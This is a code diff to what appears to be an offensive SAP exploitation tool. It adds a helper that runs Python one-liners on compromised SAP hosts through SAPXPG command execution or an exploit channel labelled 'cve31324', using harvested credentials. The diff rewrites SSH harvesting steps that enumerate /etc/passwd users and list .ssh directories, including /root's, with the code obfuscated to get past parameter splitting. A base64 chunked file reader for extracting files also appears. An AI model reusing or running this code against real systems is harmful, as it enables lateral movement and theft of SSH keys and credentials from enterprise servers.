@@ -102,6 +102,36 @@ def _make_exec_fn(node: SAPNode, channel: str = "auto"):
             logger.debug(f"ssh_lateral exec: {format_rfc_exception(e)}")
         return ""
 
+    def _run_py(code: str) -> str:
+        """Run a python3 one-liner directly via SAPXPG (no /bin/sh).
+        Proven clean output — no TLV command-echo contamination."""
+        try:
+            if channel == "sxpg":
+                from sapmap_rfc import execute_local_command
+                creds = node.best_credentials()
+                if not creds:
+                    return ""
+                r = execute_local_command(node, "python3", f"-c {code}", creds)
+            elif channel == "cve31324" or (channel == "auto" and "JAVA" in system_type):
+                if "JAVA" in system_type:
+                    run_fn, _, err = _build_java_os_exec(node)
+                    if run_fn is None:
+                        return ""
+                    r = run_fn("python3", f"-c {code}")
+                else:
+                    r = run_os_command(node, "python3", f"-c {code}")
+            else:
+                r = run_os_command(node, "python3", f"-c {code}")
+
+            if r and r.get("success"):
+                lines = r.get("output") or []
+                if isinstance(lines, list):
+                    return "\n".join(str(x) for x in lines)
+                return str(lines)
+        except Exception as e:
+            logger.debug(f"ssh_lateral _run_py: {format_rfc_exception(e)}")
+        return ""
+
     def _read_b64_chunk(path: str, offset: int, end: int) -> str:
         code = (f"print(__import__('base64').b64encode("
                 f"open('{path}','rb').read()[{offset}:{end}])"
@@ -169,6 +199,7 @@ def _make_exec_fn(node: SAPNode, channel: str = "auto"):
         return None, "exec channel not available"
 
     _run_cmd._read_b64_chunk = _read_b64_chunk
+    _run_cmd._run_py = _run_py
     return _run_cmd, label
 
 
@@ -236,24 +267,33 @@ def ssh_harvest(node: SAPNode, state: SAPMAPState,
     print(f"[*] {sid}: ssh_harvest — channel: {label}")
 
     # ---- Step 1: enumerate OS users from /etc/passwd
-    passwd_out = exec_fn("cat /etc/passwd 2>/dev/null")
+    # Use python3 directly (not /bin/sh) to avoid TLV command-echo
+    # contamination that garbles colon-delimited passwd lines.
+    # No spaces in code — SAPXPG splits PARAMS on spaces.
+    _run_py = exec_fn._run_py
+    _passwd_py = (
+        "exec(\"import\\x20os\\n"
+        "skip={'nologin','false'}\\n"
+        "for\\x20L\\x20in\\x20open('/etc/passwd'):\\n"
+        "\\x20p=L.strip().split(':')\\n"
+        "\\x20if\\x20len(p)<7:continue\\n"
+        "\\x20h=p[5];s=os.path.basename(p[6])\\n"
+        "\\x20if\\x20not\\x20h\\x20or\\x20s\\x20in\\x20skip:continue\\n"
+        "\\x20print(p[0]+':'+p[2]+':'+h+':'+p[6])\\n"
+        "\")"
+    )
+    passwd_out = _run_py(_passwd_py)
     os_users = []
     home_dirs = {}
     for line in passwd_out.splitlines():
         line = line.strip()
-        if not line or line.startswith("#"):
+        if not line:
             continue
         parts = line.split(":")
-        if len(parts) < 6:
+        if len(parts) < 4:
             continue
-        username = parts[0]
-        uid_str = parts[2] if len(parts) > 2 else ""
-        home = parts[5] if len(parts) > 5 else ""
-        shell = parts[6] if len(parts) > 6 else ""
+        username, uid_str, home, shell = parts[0], parts[1], parts[2], parts[3]
         if not home or home in ("/dev/null", "/nonexistent"):
-            continue
-        if shell and shell in ("/sbin/nologin", "/usr/sbin/nologin",
-                                "/bin/false", "/usr/bin/false"):
             continue
         os_users.append({
             "username": username,
@@ -265,10 +305,13 @@ def ssh_harvest(node: SAPNode, state: SAPMAPState,
     result["os_users"] = os_users
     print(f"[*] {sid}: ssh_harvest — {len(os_users)} users with "
           f"login shells")
+    if os_users:
+        print(f"  [*] homes: "
+              + ", ".join(f"{u['username']}={u['home']}"
+                          for u in os_users[:10]))
 
     # ---- Step 2: discover SSH directories
-    # Use individual simple commands per home dir — complex shell
-    # for-loops are fragile through SAPXPG's TLV stdout channel.
+    # Use python3 directly per home dir for reliable output.
     homes_to_check = list(set(home_dirs.values()))
     if "/root" not in homes_to_check:
         homes_to_check.append("/root")
@@ -276,14 +319,18 @@ def ssh_harvest(node: SAPNode, state: SAPMAPState,
     ssh_dirs = {}
     for home in homes_to_check:
         ssh_path = f"{home}/.ssh"
-        ls_out = exec_fn(f"ls -1 {ssh_path} 2>/dev/null")
+        _ls_py = (
+            f"exec(\"import\\x20os\\n"
+            f"d='{ssh_path}'\\n"
+            f"if\\x20os.path.isdir(d):\\n"
+            f"\\x20for\\x20f\\x20in\\x20os.listdir(d):print(f)\\n"
+            f"\")"
+        )
+        ls_out = _run_py(_ls_py)
         if not ls_out or not ls_out.strip():
             continue
-        files = []
-        for ln in ls_out.splitlines():
-            fn = ln.strip()
-            if fn and not fn.startswith("total") and not fn.startswith("ls:"):
-                files.append(fn)
+        files = [fn.strip() for fn in ls_out.splitlines()
+                 if fn.strip()]
         if files:
             ssh_dirs[ssh_path] = files
             print(f"  [*] {sid}: found .ssh at {ssh_path}: "
